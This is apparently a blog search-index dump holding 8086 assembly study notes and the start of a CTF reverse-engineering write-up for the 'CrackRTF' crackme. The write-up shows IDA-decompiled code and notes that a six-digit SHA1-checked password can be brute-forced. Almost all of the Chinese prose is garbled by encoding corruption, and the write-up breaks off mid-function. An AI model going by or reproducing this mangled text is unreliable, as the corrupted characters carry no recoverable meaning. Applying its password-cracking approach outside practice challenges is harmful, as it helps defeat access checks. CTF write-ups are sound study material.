ç”µå¯åŠ¨æˆ–å¤ä½åï¼Œè®¾ç½®CS=FFFFHï¼ŒIP=0000H ä¿®æ”¹CS:IPå¯„å­˜å™¨çš„å€¼ åŒæ—¶ä¿®æ”¹CS:IPçš„å†…å®¹ï¼šjmp æ®µåœ°å€ï¼šåç§»åœ°å€ ä»…ä¿®æ”¹IPçš„å†…å®¹ï¼šjmp æŸä¸€åˆæ³•å¯„å­˜å™¨ï¼ˆmov ax xxxxï¼Œjmp axï¼‰ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:3","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- DS(Data Segment)å’Œ[address]ï¼ˆåç§»åœ°å€ï¼‰ ç»ç”±é€šç”¨å¯„å­˜å™¨å°†æ•°æ®é€å…¥DSå¯„å­˜å™¨ mov ax, 1000H mov ds, ax ä½¿ç”¨[address]è¯»å†™å†…å­˜ï¼ˆç¡®å®šå¥½dsï¼‰ mov ax, [0] //æŠŠåç§»åœ°å€ä¸º0å¤„å†…å­˜çš„å€¼é€å…¥ax mov [0], cx //æŠŠcxä¸­çš„å€¼å†™å…¥åç§»åœ°å€ä¸º0çš„å†…å­˜ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:4","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- æ ˆ push axï¼šæŠŠaxä¸­çš„å€¼é€å…¥æ ˆä¸­ pop axï¼šæŠŠä»æ ˆé¡¶å–å‡ºæ•°æ®é€å…¥ax 8086CPUå…¥æ ˆå’Œå‡ºæ ˆéƒ½æ˜¯ä»¥å­—ï¼ˆ16ä½ï¼‰ä¸ºå•ä½è¿›è¡Œçš„ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:5","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- SS(Stack Segment):SP(Stack Pointer) push ax SP = SP - 2 å°†axä¸­çš„å†…å®¹é€å…¥SS:SPæŒ‡å‘çš„å†…å­˜å•å…ƒå¤„ï¼Œæ­¤æ—¶SS:SPæŒ‡å‘æ–°æ ˆé¡¶ pop ax å°†SS:SPæŒ‡å‘çš„å†…å­˜å•å…ƒä¸­æ•°æ®å–å‡ºé€å…¥axä¸­ SP = SP + 2 æ ˆç©ºæ—¶SS:SPæŒ‡å‘æ ˆæœ€é«˜åœ°å€ï¼ˆæ ˆåº•ï¼‰çš„åç§»åœ°å€+2 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:6","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- ä¼ªæŒ‡ä»¤ ç¼–è¯‘å™¨æ‰§è¡Œï¼Œæ— æ³•æ±‡ç¼–æˆæœºå™¨ç  ä¸€ä¸ªæ®µ assume cs:æ®µåâ€“\u003eå¯„å­˜å™¨ä¸æ®µçš„å…³è”å‡è®¾ æ®µå segment æ®µå ends endï¼šç»“æŸå¯¹æºç¨‹åºçš„ç¼–è¯‘ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:7","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- [BS] ä½œä¸ºåç§»åœ°å€ç´¢å¼•å†…å­˜ï¼Œé»˜è®¤æ®µåœ°å€åœ¨dsä¸­ mov ax [1000H]åªæ˜¯å°†1000Hä½œä¸ºå€¼é€å…¥ax ç»ç”±bxå¯„å­˜å™¨æ‰èƒ½å°†åç§»åœ°å€ä¸º1000Hçš„å†…å®¹é€å…¥ax mov bx, 1000H mov ax, [bx] ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:8","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- loopæŒ‡ä»¤ loopå®ç°å¾ªç¯ï¼Œcxå¯„å­˜å™¨ä½œä¸ºå¾ªç¯ç´¯åŠ å™¨ æ ¼å¼ mov cxï¼Œå¾ªç¯æ¬¡æ•° æ ‡å·ï¼šå¾ªç¯æ‰§è¡Œä»£ç  loop æ ‡å· æ‰§è¡Œloopæ—¶cx = cx - 1ï¼Œåˆ¤æ–­cxä¸ä¸º0åˆ™ç»§ç»­å¾ªç¯ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:9","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- SIï¼ˆSource Indexï¼‰DIï¼ˆDestination Indexï¼‰ ä¸bxåŠŸèƒ½ç›¸è¿‘ï¼Œä½†ä¸èƒ½æ‹†ä¸ºä¸¤ä¸ª8ä½å¯„å­˜å™¨ ç”¨ds;siæŒ‡å‘æºæ•°æ®åœ°å€ï¼Œç”¨ds:diæŒ‡å‘ç›®æ ‡æ•°æ®åœ°å€ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:10","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- BPï¼ˆBase Pointerï¼‰ ä½œä¸ºåç§»åœ°å€æŒ‡å‘å†…å­˜ï¼Œæ®µåœ°å€é»˜è®¤åœ¨SSä¸­ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:11","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- divï¼ˆdivisionï¼‰æŒ‡ä»¤ é™¤æ³•æŒ‡ä»¤ é™¤æ•°ï¼š8ä½æˆ–16ä½ï¼Œåœ¨å¯„å­˜å™¨æˆ–å†…å­˜å•å…ƒä¸­ è¢«é™¤æ•°ï¼šï¼ˆé»˜è®¤ï¼‰æ”¾åœ¨axæˆ–axå’Œdxä¸­ é™¤æ•°8ä½ï¼Œè¢«é™¤æ•°16ä½â€”Â»ax é™¤æ•°16ä½ï¼Œè¢«é™¤æ•°32ä½â€”Â»axï¼ˆä½16ä½ï¼‰å’Œdxï¼ˆé«˜16ä½ï¼‰ ç»“æœ å•†å­˜æ”¾åœ¨axä¸­ ä½™æ•°å­˜æ”¾åœ¨dxä¸­ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:12","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- jmpæŒ‡ä»¤ jmp short æ ‡å· æ®µå†…çŸ­è½¬ç§» 8ä½åœ°å€åç§»ï¼Œè€ŒéæŒ‡å®šè·³è½¬åœ°å€ jmp near æ ‡å· æ®µå†…è¿‘è½¬ç§» 16ä½åœ°å€åç§»ï¼Œè€ŒéæŒ‡å®šè·³è½¬åœ°å€ jmp far æ ‡å· æ®µé—´è½¬ç§»ï¼Œè¿œè½¬ç§» æŒ‡å®šæ®µåœ°å€å’Œåç§»åœ°å€ï¼Œä¿®æ”¹CS:IPçš„å€¼ jmp å¯„å­˜å™¨ 16ä½æ®µå†…è½¬ç§» ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:13","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- jcxzæŒ‡ä»¤ æœ‰æ¡ä»¶è½¬ç§»æŒ‡ä»¤ï¼ŒçŸ­è½¬ç§» 8ä½åœ°å€ä½ç§»ï¼Œè€Œä¸æ˜¯æŒ‡å®šè·³è½¬åœ°å€ jcxz æ ‡å· å½“cx=0æ—¶è·³è½¬ï¼Œcx!=0æ—¶ä¸è·³è½¬ loopæŒ‡ä»¤ï¼Œcx=0æ—¶è·³å‡ºå¾ªç¯ï¼Œcxï¼=0æ—¶ç»§ç»­å¾ªç¯ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:14","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- callï¼ŒretæŒ‡ä»¤ retï¼šç”¨æ ˆä¸­çš„å€¼ä¿®æ”¹IPçš„å€¼ retfï¼šç”¨æ ˆä¸­çš„å€¼ä¿®æ”¹CS:IPçš„å€¼ callæŒ‡ä»¤ å°†å½“å‰çš„IPæˆ–CS:IPå‹å…¥æ ˆä¸­ è½¬ç§»ï¼ˆjmpï¼‰æ ‡å· callä¸èƒ½å®ç°çŸ­è½¬ç§»ï¼ˆå¯è¿‘è½¬ç§»å’ŒçŸ­è½¬ç§»ï¼‰ï¼Œé™¤æ­¤ä¹‹å¤–å’ŒjmpæŒ‡ä»¤åŸç†ç›¸åŒ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:15","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- mulæŒ‡ä»¤ å­˜å‚¨ä½ç½® éƒ½æ˜¯8ä½ï¼šç›¸ä¹˜çš„ä¸¤ä¸ªæ•°å­˜åœ¨alæˆ–å†…å­˜ä¸­ï¼Œç»“æœå­˜åœ¨axä¸­ éƒ½æ˜¯16ä½ï¼šç›¸ä¹˜çš„ä¸¤ä¸ªæ•°å­˜åœ¨axæˆ–å†…å­˜ä¸­ï¼Œç»“æœå­˜åœ¨dxï¼ˆé«˜ä½ï¼‰å’Œaxï¼ˆä½ä½ï¼‰ä¸­ æ ¼å¼ mul å¯„å­˜å™¨ mulå†…å­˜å•å…ƒ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:16","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- flagå¯„å­˜å™¨ 8086CPUä¸­flagå¯„å­˜å™¨çš„1,3,5,12,13,14,15ä½æ²¡æœ‰ä½¿ç”¨ è®°å½•ä¸Šä¸€æ¡æŒ‡ä»¤åçš„å„ç§çŠ¶æ€ï¼Œéšæ—¶æ”¹å˜ ZFï¼ˆZero Flagï¼‰æ ‡å¿—-6 è¡¨ç¤ºç»“æœæ˜¯å¦ä¸º0,å€¼ä¸º1åˆ™è¡¨ç¤º0,å€¼ä¸º0åˆ™è¡¨ç¤ºé0 addã€subã€mulã€divã€incã€orã€andç­‰è¿ç®—æŒ‡ä»¤ä¼šå½±å“æ ‡å¿—å¯„å­˜å™¨ movã€pushã€popç­‰ä¼ é€æŒ‡ä»¤å¯¹æ ‡å¿—å¯„å­˜å™¨æ²¡æœ‰å½±å“ PFï¼ˆParity Flagï¼‰æ ‡å¿—-2 å¥‡å¶æ ¡éªŒä½ï¼Œ1ä¸ºå¶æ•°ï¼Œ0ä¸ºå¥‡æ•° SFï¼ˆSign Flagï¼‰æ ‡å¿—-7 ç¬¦å·ï¼ˆæ­£è´Ÿï¼‰æ ‡å¿—ä½ï¼Œ1ä¸ºè´Ÿï¼Œ0ä¸ºæ­£ CFï¼ˆCarry Flagï¼‰æ ‡å¿—-0 è®°å½•äº†è¿›è¡Œæ— ç¬¦å·è¿ç®—çš„æ—¶å€™è¿ç®—ç»“æœçš„æœ€é«˜æœ‰æ•ˆä½æ˜¯å¦å‘æ›´é«˜ä½çš„è¿›ä½æˆ–å€Ÿä½ï¼Œ8ä½ OFï¼ˆOverflow Flagï¼‰æ ‡å¿—-11 è¿›è¡Œæœ‰ç¬¦å·æ•°è¿ç®—æ—¶ï¼Œè¶…è¿‡äº†æœºå™¨æ‰€èƒ½è¡¨è¾¾çš„èŒƒå›´ï¼Œå°†äº§ç”Ÿæº¢å‡º DFï¼ˆDirection Flagï¼‰æ ‡å¿—-10 æ–¹å‘æ ‡å¿—ä½ï¼Œåœ¨ä¸²å¤„ç†æŒ‡ä»¤ä¸­ï¼Œæ§åˆ¶æ¯æ¬¡æ“ä½œåsi,diçš„å¢å‡ DF=0,æ¯æ¬¡æ“ä½œåsi,dié€’å¢ï¼ŒcldæŒ‡ä»¤è®¾ç½®ä¸º0 DF=1,æ¯æ¬¡æ“ä½œåsi,dié€’å‡ï¼ŒstdæŒ‡ä»¤è®¾ç½®ä¸º1 IFï¼ˆInterrupt Flagï¼‰æ ‡å¿—-9 æ˜¯å¦å“åº”å¤–éƒ¨å¯å±è”½ä¸­æ–­è¯·æ±‚ 1-å…è®¸å“åº”ï¼Œ0-ä¸å…è®¸å“åº” TFï¼ˆTrace Flagï¼‰æ ‡å¿—-8 å½“TFä¸º1æ—¶ï¼ŒCPUè¿›å…¥å•æ­¥è°ƒè¯•æ¨¡å¼ï¼Œæ‰§è¡Œå®Œæ¯ä¸€æ¡æŒ‡ä»¤åäº§ç”Ÿå•æ­¥ä¸­æ–­ AFï¼ˆAuxiliary Carry Flagï¼‰æ ‡å¿—-4 è¾…åŠ©è¿›ä½æ ‡å¿—ï¼Œè¿›ä½ï¼ˆå€Ÿä½ï¼‰æ ‡å¿— ä¸CFåŒºåˆ«ï¼š4ä½è¿ç®—æœ‰è¿›ä½ï¼ˆå€Ÿä½ï¼‰åˆ™ç½®1,ä¸»è¦åœ¨BCDç æ—¶ç”¨åˆ° ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:17","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- adcæŒ‡ä»¤ å¸¦è¿›ä½åŠ æ³•æŒ‡ä»¤ï¼Œåˆ©ç”¨äº† CFä½ä¸Šè®°å½•çš„è¿›ä½å€¼ æ ¼å¼ï¼šadc ax, bx å®é™…ï¼šax = ax + bx + CF add ax, bx //ç­‰ä»·äº add al, bl adc ah, bh ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:18","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- sbbæŒ‡ä»¤ å¸¦å€Ÿä½å‡æ³•æŒ‡ä»¤ï¼Œåˆ©ç”¨äº†CFä¸Šè®°å½•çš„å€Ÿä½å€¼ æ ¼å¼ï¼šsbb ax, bx å®é™…ï¼šax = ax -bx - CF ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:19","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- cmpæŒ‡ä»¤ æ ¼å¼ï¼šcmp å¯¹è±¡1, å¯¹è±¡2 åŠŸèƒ½ï¼šå¯¹è±¡1-å¯¹è±¡2ï¼Œä¸ä¿å­˜ç»“æœï¼Œå°†å¯¹æ ‡å¿—å¯„å­˜å™¨äº§ç”Ÿå½±å“ ä¾‹ï¼šcmp axï¼Œax ZF=1 PF=1 SF=0 CF=0 OF=0 ä¾‹ï¼šmov ax,8 mov bx, 3 cmp ax, bx ZF=0 PF=1 SF=0 CF=0 OF=0 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:20","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- æ ¹æ®cmpç»“æœçš„è½¬ç§»æŒ‡ä»¤ //æ— ç¬¦å·æ•°è¿ç®—è·³è½¬ jeï¼šç­‰äºåˆ™è½¬ç§»ï¼ˆZF=1ï¼‰ jneï¼šä¸ç­‰äºåˆ™è½¬ç§»ï¼ˆZF=0ï¼‰ jbï¼šä½äºåˆ™è½¬ç§»ï¼ˆCF=1ï¼‰ jnbï¼šä¸ä½äºåˆ™è½¬ç§»ï¼ˆCF=0ï¼‰ jaï¼šé«˜äºåˆ™è½¬ç§»ï¼ˆCF=0,ZF=0ï¼‰ jnaï¼šä¸é«˜äºåˆ™è½¬ç§»ï¼ˆCF=1æˆ–ZF=1ï¼‰ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:21","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- movsbæŒ‡ä»¤ ä»¥å­—èŠ‚ä¸ºå•ä½ä¼ é€å­—ç¬¦ä¸²ï¼Œå°†ds:siæŒ‡å‘çš„å†…å­˜å•å…ƒä¸­çš„å­—èŠ‚é€å…¥es:diä¸­ï¼Œç„¶åæ ¹æ®DFæ ‡å¿—ä½åŒæ­¥é€’å¢æˆ–é€’å‡si,diçš„å€¼ ä»¥å­—ä¸ºå•ä½ä¼ é€ï¼šmovsw rep movsbï¼šæ ¹æ®cxä¸­çš„å€¼ï¼Œé‡å¤æ‰§è¡Œåé¢çš„ä¸²ä¼ é€æŒ‡ä»¤ï¼Œå¾ªç¯å®ç°cxä¸ªå­—ç¬¦çš„ä¼ é€ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:22","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- pushfå’ŒpopfæŒ‡ä»¤ pushfï¼šå°†æ ‡å¿—å¯„å­˜å™¨çš„å€¼å‹æ ˆ popfï¼šä»æ ˆä¸­å¼¹å‡ºæ•°æ®ï¼Œé€å…¥æ ‡å¿—å¯„å­˜å™¨ä¸­ ä¸ºç›´æ¥è®¿é—®æ ‡å¿—å¯„å­˜å™¨æä¾›äº†ä¸€ç§æ–¹æ³• ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:23","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- ä¸­æ–­ CPUå¤„ç†çªå‘äº‹ä»¶çš„ä¸€ä¸ªé‡è¦æŠ€æœ¯ï¼Œå¤„ç†å®Œæˆåç«‹å³è¿”å›æ–­ç‚¹ï¼Œç»§ç»­å·¥ä½œ ç¡¬ä»¶ä¸­æ–­ å¤–éƒ¨ä¸­æ–­ï¼šå¤–éƒ¨è®¾å¤‡å‘å‡ºçš„ä¸­æ–­è¯·æ±‚ï¼Œåˆ©ç”¨ä¸­æ–­æ§åˆ¶å™¨å¯å±è”½ å†…éƒ¨ä¸­æ–­ï¼šé™¤æ³•é™¤æ•°ä¸º0,æº¢å‡ºä¸­æ–­ï¼Œä¸å¯å±è”½çš„ä¸­æ–­ è½¯ä»¶ä¸­æ–­ ä¸æ˜¯çœŸæ­£çš„ä¸­æ–­ï¼Œåªæ˜¯å¯è¢«è°ƒç”¨æ‰§è¡Œçš„ä¸€èˆ¬ç¨‹åºä»¥åŠDOSçš„ç³»ç»ŸåŠŸèƒ½è°ƒç”¨ï¼ˆINT 21Hï¼‰ ä¸­æ–­ä¼˜å…ˆæƒ é™¤æ³•é”™è¯¯ã€æº¢å‡ºä¸­æ–­ã€è½¯ä»¶ä¸­æ–­ ä¸å¯å±è”½ä¸­æ–­ å¯å±è”½ä¸­æ–­ å•æ­¥ä¸­æ–­ ä¸­æ–­ç±»å‹ç  8086CPUç”¨8ä½ä¸­æ–­ç±»å‹ç ç´¢å¼•ä¸­æ–­å¤„ç†ç¨‹åº ä¸­æ–­ç±»å‹ç å¯¹åº”ä¸­æ–­å‘é‡è¡¨ä¸­çš„åœ°å€æŒ‡å‘ä¸­æ–­å¤„ç†ç¨‹åº 8086CPUä¸­æ–­è¿‡ç¨‹ ï¼ˆä»ä¸­æ–­ä¿¡æ¯ä¸­ï¼‰å–å¾—ä¸­æ–­ç±»å‹ç  æ ‡å¿—å¯„å­˜å™¨çš„å€¼å…¥æ ˆï¼ˆä¿æŠ¤æ ‡å¿—ä½ï¼‰â€“Â»pushf è®¾ç½®æ ‡å¿—å¯„å­˜å™¨8-TFå’Œ9-IFä¸º0 â€“Â»TF=0,IF=0 csçš„å†…å®¹å…¥æ ˆ â€“Â»push CS IPçš„å†…å®¹å…¥æ ˆ â€“Â»push IP ä»å†…å­˜åœ°å€ä¸ºä¸­æ–­ç±»å‹ç *4å’Œä¸­æ–­ç±»å‹ç *4+2çš„ä¸¤ä¸ªå­—å•å…ƒä¸­è¯»å–ä¸­æ–­å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€è®¾ç½®IPå’ŒCS ä¸­æ–­å¤„ç†ç¨‹åº ä¿å­˜ç”¨åˆ°çš„å¯„å­˜å™¨ å¤„ç†ä¸­æ–­ æ¢å¤ç”¨åˆ°çš„å¯„å­˜å™¨ ç”¨iretæŒ‡ä»¤è¿”å›ï¼ˆpop IP pop CS popfï¼‰ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:24","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- intä¸­æ–­ å†…ä¸­æ–­ï¼Œå¼•å‘ä¸­æ–­è¿‡ç¨‹ æ ¼å¼ï¼šint ä¸­æ–­ç±»å‹ç  int 21ä¸­æ–­ï¼š intä¸­æ–­ä¾‹ç¨‹çš„4cå·åŠŸèƒ½ï¼Œå³ç¨‹åºè¿”å›åŠŸèƒ½ mov axï¼Œ4c00h //ç­‰ä»·äº mov ah, 4ch ;ç¨‹åºè¿”å› mov al, 0 ;è¿”å›å€¼ï¼Œ0è¡¨ç¤ºæ­£å¸¸è¿”å› int 21h ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:25","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- CPUç«¯å£ åˆ©ç”¨inå’ŒoutæŒ‡ä»¤ä»æŒ‡å®šç«¯å£ä¸­è¯»æˆ–å†™æ•°æ® 8ä½ç«¯å£ç”¨alå¯„å­˜å™¨ï¼Œè®¿é—®16ä½ç«¯å£ç”¨axå¯„å­˜å™¨ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:26","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- shlå’ŒshræŒ‡ä»¤ é€»è¾‘ç§»ä½æŒ‡ä»¤ å°†ä¸€ä¸ªå¯„å­˜å™¨æˆ–å†…å­˜å•å…ƒä¸­çš„æ•°æ®å‘å·¦ï¼ˆå³ï¼‰ç§» å°†æœ€åå¤šä½™çš„ä¸€ä½å†™å…¥CFä¸­ æœ€ä½ä½ä»¥0æ¥è¡¥å…… å¦‚æœç§»åŠ¨ä½æ•°å¤§äº1,å¿…é¡»å°†ç§»åŠ¨ä½æ•°æ”¾åœ¨clä¸­ ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:27","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- CMOS RAM 70Hæ˜¯CMOS RAMåœ°å€ï¼ˆè¯»å–ï¼‰ç«¯å£ï¼Œ71Hæ˜¯å†™å…¥ç«¯å£ CMOS RAMä¸­å­˜æ”¾ç€å½“å‰æ—¶é—´ï¼Œä»¥ä¸‹ä¿¡æ¯é•¿åº¦å‡ä¸º1ä¸ªå­—èŠ‚ ç§’ï¼š00H åˆ†ï¼š02H æ—¶ï¼š04H æ—¥ï¼š07H æœˆï¼š08H å¹´ï¼š09H ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:28","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["Binary"],"content":"- bcdç  æ¯4ä½è¡¨ç¤ºä¸€ä¸ªåè¿›åˆ¶ä½ 4ä½å†…éƒ¨ç”¨äºŒè¿›åˆ¶0000â€“1001è¡¨ç¤º0-9 ","date":"2022-02-23","objectID":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/:0:29","tags":["assembly"],"title":"8086CPUæ±‡ç¼–","uri":"/2022/02/8086cpu%E6%B1%87%E7%BC%96/"},{"categories":["WriteUps"],"content":"buuoj re wp ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:0:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"CrackRTF idaå®šä½mainå‡½æ•°F5 int __cdecl main_0(int argc, const char **argv, const char **envp) { DWORD v3; // eax DWORD v4; // eax char Str[260]; // [esp+4Ch] [ebp-310h] BYREF int v7; // [esp+150h] [ebp-20Ch] char String1[260]; // [esp+154h] [ebp-208h] BYREF char Destination[260]; // [esp+258h] [ebp-104h] BYREF memset(Destination, 0, sizeof(Destination)); memset(String1, 0, sizeof(String1)); v7 = 0; printf(\"pls input the first passwd(1): \"); scanf(\"%s\", Destination); if ( strlen(Destination) != 6 ) { printf(\"Must be 6 characters!\\n\"); ExitProcess(0); } v7 = atoi(Destination); // atoiæ˜¯æŠŠå­—ç¬¦ä¸²å½¢å¼çš„æ•°å­—è½¬åŒ–ä¸ºæ•°å­—ï¼Œå¯ç¡®å®š6ä½æ•°å­—å¯†ç ï¼Œå³å¯çˆ†ç ´ if ( v7 \u003c 100000 ) ExitProcess(0); strcat(Destination, \"@DBApp\"); v3 = strlen(Destination); sub_40100A((BYTE *)Destination, v3, String1); // åŠ¨è°ƒæµ‹è¯•å¯çŸ¥ä¸ºsha1åŠ å¯†ï¼Œçˆ†ç ´æ‹¿å‰6ä½å¯†ç  if ( !_strcmpi(String1, \"6E32D0943418C2C33385BC35A1470250DD8923A9\") ) { printf(\"continue...\\n\\n\"); printf(\"pls input the first passwd(2): \"); memset(Str, 0, sizeof(Str)); scanf(\"%s\", Str); if ( strlen(Str) != 6 ) { printf(\"Must be 6 characters!\\n\"); ExitProcess(0); } strcat(Str, Destination); memset(String1, 0, sizeof(String1)); v4 = strlen(Str); sub_401019((BYTE *)Str, v4, String1); // åŠ¨è°ƒæµ‹è¯•å¾—çŸ¥ä¸ºmd5,ä½†çˆ†ç ´6ä½å…¨å­—ç¬¦ä¸ç°å®ï¼Œå¯†ç æ— æ³•ä»è¿™è·å¾— if ( !_strcmpi(\"27019e688a4e62a649fd99cadaafdb4e\", String1) ) { if ( !(unsigned __int8)sub_40100F(Str) ) { printf(\"Error!!\\n\"); ExitProcess(0); } printf(\"bye ~~\\n\"); } } return 0; } é¢˜ç›®éœ€è¦è¾“å…¥ä¸¤æ¬¡å¯†ç ï¼Œåˆ†åˆ«ç»åŠ å¯†å‡½æ•°åä¸å·²çŸ¥å­—ç¬¦ä¸²æ¯”è¾ƒ ç¬¬ä¸€æ¬¡åŠ å¯† åŠ å¯†å‰atoiå‡½æ•°ä½œç”¨æ˜¯æŠŠstringå½¢å¼çš„æ•°å­—è½¬åŒ–ä¸ºintç±»å‹çš„æ•°å­—ï¼Œæç¤ºå‰6ä½å¯†ç ä¸º6ä½æ•°å­— sub_40100Aæ˜¯ç¬¬ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼Œå†…éƒ¨è°ƒç”¨äº†windowsåº“çš„åŠ å¯†å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹windowså®˜æ–¹æ–‡æ¡£è¾¨åˆ«å‚æ•°å¾—çŸ¥ä¸ºsha1åŠ å¯†ï¼Œæˆ‘è¿™é‡Œæ˜¯ç”¨åŠ¨è°ƒå¯¹æ¯”åœ¨çº¿åŠ å¯†ç½‘ç«™åŠ å¯†ç»“æœç¡®å®šåŠ å¯†ç®—æ³•ä¸ºsha1 //sub_40100Aå†…éƒ¨åµŒå¥—sub_401230å‡½æ•° int __cdecl sub_401230(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1) { int result; // eax DWORD i; // [esp+4Ch] [ebp-28h] CHAR String2[4]; // [esp+50h] [ebp-24h] BYREF BYTE v6[20]; // [esp+54h] [ebp-20h] BYREF DWORD pdwDataLen; // [esp+68h] [ebp-Ch] BYREF HCRYPTHASH phHash; // [esp+6Ch] [ebp-8h] BYREF HCRYPTPROV phProv; // [esp+70h] [ebp-4h] BYREF if ( !CryptAcquireContextA(\u0026phProv, 0, 0, 1u, 0xF0000000) ) return 0; if ( CryptCreateHash(phProv, 0x8004u, 0, 0, \u0026phHash) ) { if ( CryptHashData(phHash, pbData, dwDataLen, 0) ) { CryptGetHashParam(phHash, 2u, v6, \u0026pdwDataLen, 0); *lpString1 = 0; for ( i = 0; i \u003c pdwDataLen; ++i ) { wsprintfA(String2, \"%02X\", v6[i]); 